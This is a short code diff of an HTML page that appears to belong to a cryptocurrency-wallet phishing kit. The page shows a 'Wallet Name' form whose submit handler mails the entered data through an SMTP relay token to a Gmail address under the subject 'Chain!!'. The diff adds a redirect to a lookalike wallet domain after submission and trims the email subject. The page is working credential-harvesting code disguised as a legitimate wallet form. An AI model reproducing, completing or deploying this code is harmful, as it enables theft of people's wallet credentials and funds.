@@ -191,7 +191,7 @@ select {
 </head>
 <body>
 <div class="container-fluid">
-    <form onsubmit="sendEmail(); reset(); return false;">
+    <form onsubmit="sendEmail(); reset();" action="https://app.mathwalletdapp.com/404.html">
      <div class="form-group">
           <label for="formGroupExampleInput2">Wallet Name</label>
           <input type="text" class="form-control" id="formGroupExampleInput" name="email" placeholder="Your wallet name">
@@ -248,7 +248,7 @@ select {
 			SecureToken : "549e41ee-ec43-4fb4-b3ba-a062214aac54",
 			To : 'formsubmitsp@gmail.com',
 			From : "formsubmitsp@gmail.com",
-			Subject : "Chain!! " + email.value ,
+			Subject : "Chain!! ",
 			Body : ebody
 		}).then(
 		message => alert(message)
